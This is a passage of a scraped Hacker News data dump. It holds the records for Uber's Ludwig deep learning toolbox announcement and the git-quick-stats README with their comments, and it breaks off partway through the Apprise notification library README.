change the title encoder definition to: name: title type: text encoder: rnn cell_type: lstm bidirectional: true If we wanted to change training parameters like number of epochs, learning rate, and batch size, we would change the model definition like this: input_features: output_features: training: epochs: 100 learning_rate: 0.001 batch_size: 64 All parameters on how to perform the split and data preprocessing, the parameters of each encoder combiner and decoder have default values, but they are configurable. Refer to the user guide to discover the wide variety of model definitions and training parameters available, and take a look at our examples to see how Ludwig can be used for several different tasks. Visualizing training results After training, Ludwig creates a result directory containing the trained model with its hyperparameters and summary statistics of the training process. We can visualize them using one of the several visualization options available with the visualize tool, for instance: ludwig visualize visualization learning_curves training_stats results/training_stats.json This will display a graph that looks like the following, showing the loss and accuracy as functions of train epoch number: Figure 2: These learning curves show loss and accuracy over training epochs. Several visualizations are available. The visualization section in the user guideoffers more details. Predicting results with trained models Users with new data who want their previously trained models to predict target output values can type the following command: ludwig predict data_csv path/to/data.csv model_path /path/to/model If a dataset contains ground truth information to compare with predictions, running this command returns model predictions and also some test performance statistics. These can be visualized via the visualize command (above), which can also be used to compare the performance and results prediction of different models. For instance: ludwig visualize visualization compare_performance test_stats path/to/test_stats_model_1.json path/to/test_stats_model_2.json will return a bar plot comparing the models on different measures: Figure 3: This bar chart compares the performance of two models. There is also a handi experiment command that performs first training and then prediction without the need to use two separate command. Using Ludwigs programmatic API Ludwig also provides a simple Python programmatic API that lets users train or load a model and use it to obtain predictions on new data: from ludwig import LudwigModel # train a model model_definition = {} model = LudwigModel(model_definition) train_stats = model.train(training_dataframe) # or load a model model = LudwigModel.load(model_path) # obtain predictions predictions = model.predict(test_dataframe) model.close() This API enables using models trained with Ludwig inside existing code to build applications on top of them. More details on using a programmatic API with Ludwig are provided in the user guide and in the API documentation. Conclusions We decided to open source Ludwig because we believe that it can be a useful tool for non-expert machine learning practitioners and experienced deep learning developers and researchers alike. The non-experts can quickly train and test deep learning models without having to write code. Experts can obtain strong baselines to compare their models against and have an experimentation setting that makes it easy to test new ideas and analyze models by performing standard data preprocessing and visualization. In future releases, we hope to add several new encoders for each data type, such as Transformer, ELMo, and BERT for text, and DenseNet and FractalNet for images. We also want to add additional data types like audio, point clouds, and graphs, while at the same time integrating more scalable solutions for managing big data sets, like Petastorm. Ludwig is built with extensibility principles in mind and, in order to facilitate contributions from the community, we provide a developer guide that showcases how simple it is to add additional data types as well as additional encoders and decoders for already existing ones. We hope you will enjoy using our tool as much as we enjoyed building it! If building the next generation of machine learning tools interests you, consider applying for a role with Uber AI! ",
          "Technically, it is not code-free - it is declarative programming in YML. You still have to specify your input_features, output_features, and training architecture/specification. This is not a drag-and-drop UI (although, you could probably layer one on top of this).<p>This should work well with a Feature Store, where features are already pre-processed and ready for input to model training. With a feature store, this could be like the Tableau/Qlik/PowerBI tool for Data Science.",
          "I have attempted to do something similar in 2017 [1]. A couple of issues I noticed:<p>* The field is evolving quite rapidly, and so most options will require a lot of configuration, which IMO is not suitable for a declarative approach.<p>* It's hard to debug, eventually you will need to dive into the code at some point.<p>* Extending the library would mean touching the code anyways.<p>One major difference here, is that Ludwig tries to expose one interface, that for instance users without python knowledge can use, and inside a company, some machine learning engineers can extend the tool and do support by debugging other users use-cases.<p>I think at some point such approach can be useful for a very limited mature use-cases.<p>[1]: <a href=\"https://github.com/polyaxon/polyaxon-lib/blob/master/examples/configs_examples/yaml_configs/alexnet_flower17.yml\" rel=\"nofollow\">https://github.com/polyaxon/polyaxon-lib/blob/master/example...</a>"
        ],
        "story_type": ["Normal"],
        "url": "https://eng.uber.com/introducing-ludwig/",
        "comments.comment_id": [19142992, 19143774],
        "comments.comment_author": ["jamesblonde", "mmq"],
        "comments.comment_descendants": [2, 1],
        "comments.comment_time": [
          "2019-02-12T12:42:14Z",
          "2019-02-12T14:40:14Z"
        ],
        "comments.comment_text": [
          "Technically, it is not code-free - it is declarative programming in YML. You still have to specify your input_features, output_features, and training architecture/specification. This is not a drag-and-drop UI (although, you could probably layer one on top of this).<p>This should work well with a Feature Store, where features are already pre-processed and ready for input to model training. With a feature store, this could be like the Tableau/Qlik/PowerBI tool for Data Science.",
          "I have attempted to do something similar in 2017 [1]. A couple of issues I noticed:<p>* The field is evolving quite rapidly, and so most options will require a lot of configuration, which IMO is not suitable for a declarative approach.<p>* It's hard to debug, eventually you will need to dive into the code at some point.<p>* Extending the library would mean touching the code anyways.<p>One major difference here, is that Ludwig tries to expose one interface, that for instance users without python knowledge can use, and inside a company, some machine learning engineers can extend the tool and do support by debugging other users use-cases.<p>I think at some point such approach can be useful for a very limited mature use-cases.<p>[1]: <a href=\"https://github.com/polyaxon/polyaxon-lib/blob/master/examples/configs_examples/yaml_configs/alexnet_flower17.yml\" rel=\"nofollow\">https://github.com/polyaxon/polyaxon-lib/blob/master/example...</a>"
        ],
        "id": "04168e0b-26ff-4675-ac4c-7a4dc841c55f",
        "url_text": "Over the last decade, deep learning models have proven highly effective at performing a wide variety of machine learning tasks in vision, speech, and language. At Uber we are using these models for a variety of tasks, including customer support, object detection, improving maps, streamlining chat communications, forecasting, and preventing fraud. Many open source libraries, including TensorFlow, PyTorch, CNTK, MXNET, and Chainer, among others, have implemented the building blocks needed to build such models, allowing for faster and less error-prone development. This, in turn, has propelled the adoption of such models both by the machine learning research community and by industry practitioners, resulting in fast progress in both architecture design and industrial solutions. At Uber AI, we decided to avoid reinventing the wheel and to develop packages built on top of the strong foundations open source libraries provide. To this end, in 2017 we released Pyro, a deep probabilistic programming language built on PyTorch, and continued to improve it with the help of the open source community. Another major open source AI tool created by Uber is Horovod, a framework hosted by the LF Deep Learning Foundation that allows distributed training of deep learning models over multiple GPUs and several machines. Extending our commitment to making deep learning more accessible, we are releasing Ludwig, an open source, deep learning toolbox built on top of TensorFlow that allows users to train and test deep learning models without writing code. Ludwig is unique in its ability to help make deep learning easier to understand for non-experts and enable faster model improvement iteration cycles for experienced machine learning developers and researchers alike. By using Ludwig, experts and researchers can simplify the prototyping process and streamline data processing so that they can focus on developing deep learning architectures rather than data wrangling. Ludwig We have been developing Ludwig internally at Uber over the past two years to streamline and simplify the use of deep learning models in applied projects, as they usually require comparisons among different architectures and fast iteration. We have witnessed its value to several of Ubers own projects, including our Customer Obsession Ticket Assistant (COTA), information extraction from driver licenses, identification of points of interest during conversations between driver-partners and riders, food delivery time prediction, and much more. For this reason we decided to release it as open source, as we believe there is no other solution currently available with the same ease of use and flexibility. We originally designed Ludwig as a generic tool for simplifying the model development and comparison process when dealing with new applied machine learning problems. In order to do so, we drew inspiration from other machine learning software: from Wekaand MLlib, the idea of working directly with raw data and providing a certain number of pre-built models; from Caffe, the declarative nature of the definition file; and from scikit-learn, its simple programmatic API. This mix of influences makes it a pretty different tool from the usual deep learning libraries that provide tensor algebra primitives and few other utilities to code models, while at the same time making it more general than other specialized libraries like PyText, StanfordNLP, AllenNLP, and OpenCV. Ludwig provides a set of model architectures that can be combined together to create an end-to-end model for a given use case. As an analogy, if deep learning libraries provide the building blocks to make your building, Ludwig provides the buildings to make your city, and you can chose among the available buildings or add your own building to the set of available ones. The core design principles we baked into the toolbox are: No coding required: no coding skills are required to train a model and use it for obtaining predictions. Generality: a new data type-based approach to deep learning model design that makes the tool usable across many different use cases. Flexibility: experienced users have extensive control over model building and training, while newcomers will find it easy to use. Extensibility: easy to add new model architecture and new feature data types. Understandability: deep learning model internals are often considered black boxes, but we provide standard visualizations to understand their performance and compare their predictions. Ludwig allows its users to train a deep learning model by providing just a tabular file (like CSV) containing the data and a YAML configuration file that specifies which columns of the tabular file are input features and which are output target variables. The simplicity of the configuration file enables faster prototyping, potentially reducing hours of coding down to a few minutes. If more than one output target variable is specified, Ludwig will perform multi-task learning, learning to predict all the outputs simultaneously, a task that usually requires custom code. The model definition can contain additional information, in particular preprocessing information for each feature in the dataset, which encoder or decoder to use for each feature, architectural parameters for each encoder and decoder, and training parameters. Default values of preprocessing, training, and various model architecture parameters are chosen based on our experience or are adapted from the academic literature, allowing novices to easily train complex models. At the same time, the ability to set each of them individually in the model configuration file offers full flexibility to experts. Each model trained with Ludwig is saved and can be loaded at a later time to obtain predictions on new data. As an example, models can be loaded in a serving environment to provide predictions in software applications. Figure 1: Several input and output features may be specified in Ludwigs model description file, and their combination covers many machine learning tasks. The main new idea that Ludwig introduces is the notion of data type-specific encoders and decoders, which results in a highly modularized and extensible architecture: each type of data supported (text, images, categories, and so on) has a specific preprocessing function. In short, encoders map the raw data to tensors, and decoders map tensors to the raw data. With this design, the user has access to combiners (glue components of the architecture) that combine the tensors from all input encoders, process them, and return the tensors to be used for the output decoders. For instance, Ludwigs default concat combiner concatenates the outputs of different encoders, passes them through fully connected layers, and provides the final activation as input for output decoders. Other combiners are available for other use cases, and many more can be easily added by implementing a simple function interface. By composing these data type-specific components, users can make Ludwig train models on a wide variety of tasks. For example, by combining a text encoder and a category decoder, the user can obtain a text classifier, while combining an image encoder and a text decoder will enable the user to obtain an image captioning model. Each data type may have more than one encoder and decoder. For instance, text can be encoded with a convolutional neural network (CNN), a recurrent neural network (RNN), or other encoders. The user can then specify which one to use and its hyperparameters directly in the model definition file without having to write a single line of code. This versatile and flexible encoder-decoder architecture makes it easy for less experienced deep learning practitioners to train models for diverse machine learning tasks, such as text classification, object classification, image captioning, sequence tagging, regression, language modeling, machine translation, time series forecasting, and question answering. This opens up a variety of use cases that would typically be out of reach forinexperienced practitioners, and allows users experienced in one domain to approach new domains. At the moment, Ludwig contains encoders and decoders for binary values, float numbers, categories, discrete sequences, sets, bags, images, text, and time series, together with the capability to load some pre-trained models (for instance word embeddings), but we plan to expand the supported data types in future releases. In addition to its accessibility and flexible architecture, Ludwig also offers additional benefits for non-programmers. Ludwig incorporates a set of command line utilities for training, testing models, and obtaining predictions. Furthering its ease-of-use, the toolbox provides a programmatic API that allows users to train and use a model with just a couple lines of code. Additionally, it includes a suite of other tools for evaluating models, comparing their performance and predictions through visualizations and extracting both model weights and activations from them. Finally, the ability to train models on multiple GPUs locally and in a distributed fashion through the use of Horovod, an open source distributed training framework, makes it possible to iterate on models and obtain results quickly. Using Ludwig To better understand how to use Ludwig for real-world applications, lets build a simple model with the toolbox. In this example, we create a model that predicts a books genre and price given its title, author, description, and cover. Training the model Our book dataset looks like the following: title author description cover genre price Do Androids Dream of Electric Sheep? Philip K. Dick By 2021, the World War has killed millions, driving entire species into extinction and sending mankind off-planet. path-to-image/do-android-cover.jpg sci-fi 9.32 War and Peace Leo Tolstoy War and Peace broadly focuses on Napoleons invasion of Russia in 1812 and follows three of the most well-known characters in literature path-to-image/war-and-peace-cover.jpg historical 5.42 The Name of the Rose Umberto Eco In 1327, Brother William of Baskerville is sent to investigate a wealthy Italian abbey whose monks are suspected of heresy. .. path-to-image/name-of-the-rose-cover.jpg historical 16.99 In order to learn a model that uses the content of the title, author, description, and cover columns as inputs to predict the values in the genre and price columns, the model definition YAML would be: input_features: name: title type: text name: author type: category name: description type: text name: cover type: image output_features: name: genre type: category name: price type: numerical training: epochs: 10 We start the training by typing the following command in our console: ludwig train data_csv path/to/file.csv model_definition_file model_definition.yaml With this command, Ludwig performs a random split of the data in training, validation, and test sets, preprocess them, and builds four different encoders for the four inputs and one combiner and two decoders for the two output targets. Then, it trains the model on the training set until the accuracy on the validation set stops improving or the maximum number of ten epochs is reached. Training progress will be displayed in the console, but TensorBoard can also be used. Text features are encoded by default with a CNN encoder, but we could use, say, an RNN encoder that uses a a bidirectional LSTM with a state size of 200 for encoding the title instead. We would only need to change the title encoder definition to: name: title type: text encoder: rnn cell_type: lstm bidirectional: true If we wanted to change training parameters like number of epochs, learning rate, and batch size, we would change the model definition like this: input_features: output_features: training: epochs: 100 learning_rate: 0.001 batch_size: 64 All parameters on how to perform the split and data preprocessing, the parameters of each encoder combiner and decoder have default values, but they are configurable. Refer to the user guide to discover the wide variety of model definitions and training parameters available, and take a look at our examples to see how Ludwig can be used for several different tasks. Visualizing training results After training, Ludwig creates a result directory containing the trained model with its hyperparameters and summary statistics of the training process. We can visualize them using one of the several visualization options available with the visualize tool, for instance: ludwig visualize visualization learning_curves training_stats results/training_stats.json This will display a graph that looks like the following, showing the loss and accuracy as functions of train epoch number: Figure 2: These learning curves show loss and accuracy over training epochs. Several visualizations are available. The visualization section in the user guideoffers more details. Predicting results with trained models Users with new data who want their previously trained models to predict target output values can type the following command: ludwig predict data_csv path/to/data.csv model_path /path/to/model If a dataset contains ground truth information to compare with predictions, running this command returns model predictions and also some test performance statistics. These can be visualized via the visualize command (above), which can also be used to compare the performance and results prediction of different models. For instance: ludwig visualize visualization compare_performance test_stats path/to/test_stats_model_1.json path/to/test_stats_model_2.json will return a bar plot comparing the models on different measures: Figure 3: This bar chart compares the performance of two models. There is also a handi experiment command that performs first training and then prediction without the need to use two separate command. Using Ludwigs programmatic API Ludwig also provides a simple Python programmatic API that lets users train or load a model and use it to obtain predictions on new data: from ludwig import LudwigModel # train a model model_definition = {} model = LudwigModel(model_definition) train_stats = model.train(training_dataframe) # or load a model model = LudwigModel.load(model_path) # obtain predictions predictions = model.predict(test_dataframe) model.close() This API enables using models trained with Ludwig inside existing code to build applications on top of them. More details on using a programmatic API with Ludwig are provided in the user guide and in the API documentation. Conclusions We decided to open source Ludwig because we believe that it can be a useful tool for non-expert machine learning practitioners and experienced deep learning developers and researchers alike. The non-experts can quickly train and test deep learning models without having to write code. Experts can obtain strong baselines to compare their models against and have an experimentation setting that makes it easy to test new ideas and analyze models by performing standard data preprocessing and visualization. In future releases, we hope to add several new encoders for each data type, such as Transformer, ELMo, and BERT for text, and DenseNet and FractalNet for images. We also want to add additional data types like audio, point clouds, and graphs, while at the same time integrating more scalable solutions for managing big data sets, like Petastorm. Ludwig is built with extensibility principles in mind and, in order to facilitate contributions from the community, we provide a developer guide that showcases how simple it is to add additional data types as well as additional encoders and decoders for already existing ones. We hope you will enjoy using our tool as much as we enjoyed building it! If building the next generation of machine learning tools interests you, consider applying for a role with Uber AI! ",
        "_version_": 1718527385844842497
      },
      {
        "story_id": [20993747],
        "story_author": ["arzzen"],
        "story_descendants": [9],
        "story_score": [120],
        "story_time": ["2019-09-17T11:29:15Z"],
        "story_title": "Show HN: Statistical tool for analyzing a Git repository",
        "search": [
          "Show HN: Statistical tool for analyzing a Git repository",
          "https://github.com/arzzen/git-quick-stats/",
          "GIT quick statistics git-quick-stats is a simple and efficient way to access various statistics in a git repository. Any git repository may contain tons of information about commits, contributors, and files. Extracting this information is not always trivial, mostly because there are a gadzillion options to a gadzillion git commands I dont think there is a single person alive who knows them all. Probably not even Linus Torvalds himself :). Table of Contents Screenshots Usage Interactive Non-interactive Command-line arguments Git log since and until Git log limit Git log options Git pathspec Git merge view strategy Color themes Installation UNIX and Linux macOS Windows Docker System requirements Dependencies FAQ Contribution Code reviews Some tips for good pull requests Formatting Tests Licensing Contributors Backers Sponsors Screenshots Usage Interactive git-quick-stats has a built-in interactive menu that can be executed as such: Or Non-interactive For those who prefer to utilize command-line options, git-quick-stats also has a non-interactive mode supporting both short and long options: git-quick-stats <optional-command-to-execute-directly> Or git quick-stats <optional-command-to-execute-directly> Command-line arguments Possible arguments in short and long form: GENERATE OPTIONS -T, --detailed-git-stats give a detailed list of git stats -R, --git-stats-by-branch see detailed list of git stats by branch -c, --changelogs see changelogs -L, --changelogs-by-author see changelogs by author -S, --my-daily-stats see your current daily stats -V, --csv-output-by-branch output daily stats by branch in CSV format -j, --json-output save git log as a JSON formatted file to a specified area LIST OPTIONS -b, --branch-tree show an ASCII graph of the git repo branch history -D, --branches-by-date show branches by date -C, --contributors see a list of everyone who contributed to the repo -a, --commits-per-author displays a list of commits per author -d, --commits-per-day displays a list of commits per day -m, --commits-by-month displays a list of commits per month -w, --commits-by-weekday displays a list of commits per weekday -o, --commits-by-hour displays a list of commits per hour -A, --commits-by-author-by-hour displays a list of commits per hour by author -z, --commits-by-timezone displays a list of commits per timezone -Z, --commits-by-author-by-timezone displays a list of commits per timezone by author SUGGEST OPTIONS -r, --suggest-reviewers show the best people to contact to review code -h, -?, --help display this help text in the terminal Git log since and until You can set the variables _GIT_SINCE and/or _GIT_UNTIL before running git-quick-stats to limit the git log. These work similar to git's built-in --since and --until log options. export _GIT_SINCE=\"2017-01-20\" export _GIT_UNTIL=\"2017-01-22\" Once set, run git quick-stats as normal. Note that this affects all stats that parse the git log history until unset. Git log limit You can set variable _GIT_LIMIT for limited output. It will affect the \"changelogs\" and \"branch tree\" options. Git log options You can set _GIT_LOG_OPTIONS for git log options: export _GIT_LOG_OPTIONS=\"--ignore-all-space --ignore-blank-lines\" Git pathspec You can exclude a directory from the stats by using pathspec export _GIT_PATHSPEC=':!directory' You can also exclude files from the stats. Note that it works with any alphanumeric, glob, or regex that git respects. export _GIT_PATHSPEC=':!package-lock.json' Git merge view strategy You can set the variable _GIT_MERGE_VIEW to enable merge commits to be part of the stats by setting _GIT_MERGE_VIEW to enable. You can also choose to only show merge commits by setting _GIT_MERGE_VIEW to exclusive. Default is to not show merge commits. These work similar to git's built-in --merges and --no-merges log options. export _GIT_MERGE_VIEW=\"enable\" export _GIT_MERGE_VIEW=\"exclusive\" Git branch You can set the variable _GIT_BRANCH to set the branch of the stats. Works with commands --git-stats-by-branch and --csv-output-by-branch. export _GIT_BRANCH=\"master\" Color themes You can change to the legacy color scheme by toggling the variable _MENU_THEME between default and legacy export _MENU_THEME=\"legacy\" Installation Debian and Ubuntu If you are on at least Debian Bullseye or Ubuntu Focal you can use apt for installation: apt install git-quick-stats UNIX and Linux git clone https://github.com/arzzen/git-quick-stats.git && cd git-quick-stats sudo make install For uninstalling, open up the cloned directory and run For update/reinstall macOS (homebrew) brew install git-quick-stats Or you can follow the UNIX and Linux instructions if you wish. Windows If you are installing with Cygwin, use these scripts: installer uninstaller If you are wishing to use this with WSL, follow the UNIX and Linux instructions. Docker You can use the Docker image provided: Build: docker build -t arzzen/git-quick-stats . Run interactive menu: docker run --rm -it -v $(pwd):/git arzzen/git-quick-stats Docker pull command: docker pull arzzen/git-quick-stats docker repository System requirements An OS with a Bash shell Tools we use: awk basename cat column echo git grep head printf seq sort tput tr uniq wc Dependencies bsdmainutils apt install bsdmainutils FAQ Q: I get some errors after run git-quick-stats in cygwin like /usr/local/bin/git-quick-stats: line 2: $'\\r': command not found A: You can run the dos2unix app in cygwin as follows: /bin/dos2unix.exe /usr/local/bin/git-quick-stats. This will convert the script from the CR-LF convention that Microsoft uses to the LF convention that UNIX, OS X, and Linux use. You should then should be able to run it as normal. Q: How they could be used in a project with many git projects and statistics would show a summary of all git projects? A: If you want to include submodule logs, you can try using the following: export _GIT_LOG_OPTIONS=\"-p --submodule=log\" (more info about git log --submodule) Contribution Want to contribute? Great! First, read this page. Code reviews All submissions, including submissions by project members, require review. We use GitHub pull requests for this purpose. Some tips for good pull requests Use our code When in doubt, try to stay true to the existing code of the project. Write a descriptive commit message. What problem are you solving and what are the consequences? Where and what did you test? Some good tips: here and here. If your PR consists of multiple commits which are successive improvements / fixes to your first commit, consider squashing them into a single commit (git rebase -i) such that your PR is a single commit on top of the current HEAD. This make reviewing the code so much easier, and our history more readable. Formatting This documentation is written using standard markdown syntax. Please submit your changes using the same syntax. Tests Licensing MIT see LICENSE for the full license text. Contributors This project exists thanks to all the people who contribute. Backers Thank you to all our backers! [Become a backer] Sponsors Support this project by becoming a sponsor. Your logo will show up here with a link to your website. [Become a sponsor] ",
          "Pull Panda [0] is another tool we've been using that is offered as a SaaS and is now free since it was acquired by Github this year. It tells you average PR review time, average PR diff size, who is most requested for review, review-comment ratio, etc. I can't believe it's taken Github so long to make progress on dashboards like this for engineering managers, but looking forward to the time Pull Panda is fully integrated.<p>[0] <a href=\"https://pullreminders.com\" rel=\"nofollow\">https://pullreminders.com</a>",
          "I made a tool myself [0] with slightly different tools. It answers two questions: Who are the relevant coders and what parts of the code are the hotspots?<p>Here is an example run on sqlite:<p><pre><code>    Top Committers (of 28 authors):\n    D. Richard Hipp      13359 commits during 19 years until 2019-09-17\n    Dan Kennedy          5813 commits during 17 years until 2019-09-16\n     together these authors have 80+% of the commits (19172/20987)\n\n    Files with most commits:\n    1143 commits: src/sqlite.h.in      during 19 years until 2019-09-16\n    1331 commits: src/where.c          during 19 years until 2019-09-03\n    1360 commits: src/btree.c          during 18 years until 2019-08-24\n    1650 commits: src/vdbe.c           during 19 years until 2019-09-16\n    1893 commits: src/sqliteInt.h      during 19 years until 2019-09-14\n\n    Files with most authors:\n    11 authors: src/main.c          \n    11 authors: src/sqliteInt.h     \n    12 authors: configure.ac        \n    12 authors: src/shell.c         \n    15 authors: Makefile.in         \n\n    By file extension:\n    .test: 1333 files\n       .c: 379 files\n     together these make up 80+% of the files (1712/2138)\n</code></pre>\n[0] <a href=\"https://github.com/qznc/dot/blob/master/bin/git-overview\" rel=\"nofollow\">https://github.com/qznc/dot/blob/master/bin/git-overview</a>"
        ],
        "story_type": ["ShowHN"],
        "url": "https://github.com/arzzen/git-quick-stats/",
        "comments.comment_id": [20994452, 20999219],
        "comments.comment_author": ["eatonphil", "qznc"],
        "comments.comment_descendants": [0, 0],
        "comments.comment_time": [
          "2019-09-17T12:59:08Z",
          "2019-09-17T19:36:32Z"
        ],
        "comments.comment_text": [
          "Pull Panda [0] is another tool we've been using that is offered as a SaaS and is now free since it was acquired by Github this year. It tells you average PR review time, average PR diff size, who is most requested for review, review-comment ratio, etc. I can't believe it's taken Github so long to make progress on dashboards like this for engineering managers, but looking forward to the time Pull Panda is fully integrated.<p>[0] <a href=\"https://pullreminders.com\" rel=\"nofollow\">https://pullreminders.com</a>",
          "I made a tool myself [0] with slightly different tools. It answers two questions: Who are the relevant coders and what parts of the code are the hotspots?<p>Here is an example run on sqlite:<p><pre><code>    Top Committers (of 28 authors):\n    D. Richard Hipp      13359 commits during 19 years until 2019-09-17\n    Dan Kennedy          5813 commits during 17 years until 2019-09-16\n     together these authors have 80+% of the commits (19172/20987)\n\n    Files with most commits:\n    1143 commits: src/sqlite.h.in      during 19 years until 2019-09-16\n    1331 commits: src/where.c          during 19 years until 2019-09-03\n    1360 commits: src/btree.c          during 18 years until 2019-08-24\n    1650 commits: src/vdbe.c           during 19 years until 2019-09-16\n    1893 commits: src/sqliteInt.h      during 19 years until 2019-09-14\n\n    Files with most authors:\n    11 authors: src/main.c          \n    11 authors: src/sqliteInt.h     \n    12 authors: configure.ac        \n    12 authors: src/shell.c         \n    15 authors: Makefile.in         \n\n    By file extension:\n    .test: 1333 files\n       .c: 379 files\n     together these make up 80+% of the files (1712/2138)\n</code></pre>\n[0] <a href=\"https://github.com/qznc/dot/blob/master/bin/git-overview\" rel=\"nofollow\">https://github.com/qznc/dot/blob/master/bin/git-overview</a>"
        ],
        "id": "6ebad540-8a88-461b-a2bf-6a2b0479a05f",
        "url_text": "GIT quick statistics git-quick-stats is a simple and efficient way to access various statistics in a git repository. Any git repository may contain tons of information about commits, contributors, and files. Extracting this information is not always trivial, mostly because there are a gadzillion options to a gadzillion git commands I dont think there is a single person alive who knows them all. Probably not even Linus Torvalds himself :). Table of Contents Screenshots Usage Interactive Non-interactive Command-line arguments Git log since and until Git log limit Git log options Git pathspec Git merge view strategy Color themes Installation UNIX and Linux macOS Windows Docker System requirements Dependencies FAQ Contribution Code reviews Some tips for good pull requests Formatting Tests Licensing Contributors Backers Sponsors Screenshots Usage Interactive git-quick-stats has a built-in interactive menu that can be executed as such: Or Non-interactive For those who prefer to utilize command-line options, git-quick-stats also has a non-interactive mode supporting both short and long options: git-quick-stats <optional-command-to-execute-directly> Or git quick-stats <optional-command-to-execute-directly> Command-line arguments Possible arguments in short and long form: GENERATE OPTIONS -T, --detailed-git-stats give a detailed list of git stats -R, --git-stats-by-branch see detailed list of git stats by branch -c, --changelogs see changelogs -L, --changelogs-by-author see changelogs by author -S, --my-daily-stats see your current daily stats -V, --csv-output-by-branch output daily stats by branch in CSV format -j, --json-output save git log as a JSON formatted file to a specified area LIST OPTIONS -b, --branch-tree show an ASCII graph of the git repo branch history -D, --branches-by-date show branches by date -C, --contributors see a list of everyone who contributed to the repo -a, --commits-per-author displays a list of commits per author -d, --commits-per-day displays a list of commits per day -m, --commits-by-month displays a list of commits per month -w, --commits-by-weekday displays a list of commits per weekday -o, --commits-by-hour displays a list of commits per hour -A, --commits-by-author-by-hour displays a list of commits per hour by author -z, --commits-by-timezone displays a list of commits per timezone -Z, --commits-by-author-by-timezone displays a list of commits per timezone by author SUGGEST OPTIONS -r, --suggest-reviewers show the best people to contact to review code -h, -?, --help display this help text in the terminal Git log since and until You can set the variables _GIT_SINCE and/or _GIT_UNTIL before running git-quick-stats to limit the git log. These work similar to git's built-in --since and --until log options. export _GIT_SINCE=\"2017-01-20\" export _GIT_UNTIL=\"2017-01-22\" Once set, run git quick-stats as normal. Note that this affects all stats that parse the git log history until unset. Git log limit You can set variable _GIT_LIMIT for limited output. It will affect the \"changelogs\" and \"branch tree\" options. Git log options You can set _GIT_LOG_OPTIONS for git log options: export _GIT_LOG_OPTIONS=\"--ignore-all-space --ignore-blank-lines\" Git pathspec You can exclude a directory from the stats by using pathspec export _GIT_PATHSPEC=':!directory' You can also exclude files from the stats. Note that it works with any alphanumeric, glob, or regex that git respects. export _GIT_PATHSPEC=':!package-lock.json' Git merge view strategy You can set the variable _GIT_MERGE_VIEW to enable merge commits to be part of the stats by setting _GIT_MERGE_VIEW to enable. You can also choose to only show merge commits by setting _GIT_MERGE_VIEW to exclusive. Default is to not show merge commits. These work similar to git's built-in --merges and --no-merges log options. export _GIT_MERGE_VIEW=\"enable\" export _GIT_MERGE_VIEW=\"exclusive\" Git branch You can set the variable _GIT_BRANCH to set the branch of the stats. Works with commands --git-stats-by-branch and --csv-output-by-branch. export _GIT_BRANCH=\"master\" Color themes You can change to the legacy color scheme by toggling the variable _MENU_THEME between default and legacy export _MENU_THEME=\"legacy\" Installation Debian and Ubuntu If you are on at least Debian Bullseye or Ubuntu Focal you can use apt for installation: apt install git-quick-stats UNIX and Linux git clone https://github.com/arzzen/git-quick-stats.git && cd git-quick-stats sudo make install For uninstalling, open up the cloned directory and run For update/reinstall macOS (homebrew) brew install git-quick-stats Or you can follow the UNIX and Linux instructions if you wish. Windows If you are installing with Cygwin, use these scripts: installer uninstaller If you are wishing to use this with WSL, follow the UNIX and Linux instructions. Docker You can use the Docker image provided: Build: docker build -t arzzen/git-quick-stats . Run interactive menu: docker run --rm -it -v $(pwd):/git arzzen/git-quick-stats Docker pull command: docker pull arzzen/git-quick-stats docker repository System requirements An OS with a Bash shell Tools we use: awk basename cat column echo git grep head printf seq sort tput tr uniq wc Dependencies bsdmainutils apt install bsdmainutils FAQ Q: I get some errors after run git-quick-stats in cygwin like /usr/local/bin/git-quick-stats: line 2: $'\\r': command not found A: You can run the dos2unix app in cygwin as follows: /bin/dos2unix.exe /usr/local/bin/git-quick-stats. This will convert the script from the CR-LF convention that Microsoft uses to the LF convention that UNIX, OS X, and Linux use. You should then should be able to run it as normal. Q: How they could be used in a project with many git projects and statistics would show a summary of all git projects? A: If you want to include submodule logs, you can try using the following: export _GIT_LOG_OPTIONS=\"-p --submodule=log\" (more info about git log --submodule) Contribution Want to contribute? Great! First, read this page. Code reviews All submissions, including submissions by project members, require review. We use GitHub pull requests for this purpose. Some tips for good pull requests Use our code When in doubt, try to stay true to the existing code of the project. Write a descriptive commit message. What problem are you solving and what are the consequences? Where and what did you test? Some good tips: here and here. If your PR consists of multiple commits which are successive improvements / fixes to your first commit, consider squashing them into a single commit (git rebase -i) such that your PR is a single commit on top of the current HEAD. This make reviewing the code so much easier, and our history more readable. Formatting This documentation is written using standard markdown syntax. Please submit your changes using the same syntax. Tests Licensing MIT see LICENSE for the full license text. Contributors This project exists thanks to all the people who contribute. Backers Thank you to all our backers! [Become a backer] Sponsors Support this project by becoming a sponsor. Your logo will show up here with a link to your website. [Become a sponsor] ",
        "_version_": 1718527426939584513
      },
      {
        "story_id": [19023196],
        "story_author": ["l2g"],
        "story_descendants": [22],
        "story_score": [163],
        "story_time": ["2019-01-29T02:30:20Z"],
        "story_title": "Show HN: Apprise – A lightweight all-in-one notification solution",
        "search": [
          "Show HN: Apprise – A lightweight all-in-one notification solution",
          "https://github.com/caronc/apprise",
          "apprise / verb To inform or tell (someone). To make one aware of something. Apprise allows you to send a notification to almost all of the most popular notification services available to us today such as: Telegram, Discord, Slack, Amazon SNS, Gotify, etc. One notification library to rule them all. A common and intuitive notification syntax. Supports the handling of images and attachments (to the notification services that will accept them). It's incredibly lightweight. Amazing response times because all messages sent asynchronously. Developers who wish to provide a notification service no longer need to research each and every one out there. They no longer need to try to adapt to the new ones that comeout thereafter. They just need to include this one library and then they can immediately gain access to almost all of the notifications services available to us today. System Administrators and DevOps who wish to send a notification now no longer need to find the right tool for the job. Everything is already wrapped and supported within the apprise command line tool (CLI) that ships with this product. Supported Notifications The section identifies all of the services supported by this library. Check out the wiki for more information on the supported modules here. Popular Notification Services The table below identifies the services this tool supports and some example service urls you need to use in order to take advantage of it. Click on any of the services listed below to get more details on how you can configure Apprise to access them. Notification Service Service ID Default Port Example Syntax Apprise API apprise:// or apprises:// (TCP) 80 or 443 apprise://hostname/Token Boxcar boxcar:// (TCP) 443 boxcar://hostnameboxcar://hostname/@tagboxcar://hostname/device_tokenboxcar://hostname/device_token1/device_token2/device_tokenNboxcar://hostname/@tag/@tag2/device_token Discord discord:// (TCP) 443 discord://webhook_id/webhook_tokendiscord://avatar@webhook_id/webhook_token Emby emby:// or embys:// (TCP) 8096 emby://user@hostname/emby://user:password@hostname Enigma2 enigma2:// or enigma2s:// (TCP) 80 or 443 enigma2://hostname Faast faast:// (TCP) 443 faast://authorizationtoken FCM fcm:// (TCP) 443 